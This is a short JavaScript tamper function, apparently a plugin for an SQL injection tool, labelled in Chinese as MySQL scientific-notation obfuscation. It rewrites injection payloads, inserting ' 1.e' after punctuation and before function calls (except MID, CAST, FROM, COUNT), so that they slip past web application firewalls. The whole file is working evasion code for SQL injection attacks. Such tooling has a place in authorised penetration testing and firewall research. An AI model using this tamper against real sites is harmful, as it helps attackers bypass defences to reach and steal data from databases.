//@name: 科学计数混淆
//@usage: payload
//@enable: false
//@description: MySQL科学计数法混淆（) , . * ^ / | & 后插 1.e，函数名后接 1.e(）
function tamper(payload){
    if (!payload) { return payload; }
    payload = payload.replace(/[),.*^\/|&]/g, ' 1.e$&');
    payload = payload.replace(/(\w+)\(/g, function(m, w){
        return /^(MID|CAST|FROM|COUNT)$/i.test(w) ? m : w + ' 1.e(';
    });
    return payload;
}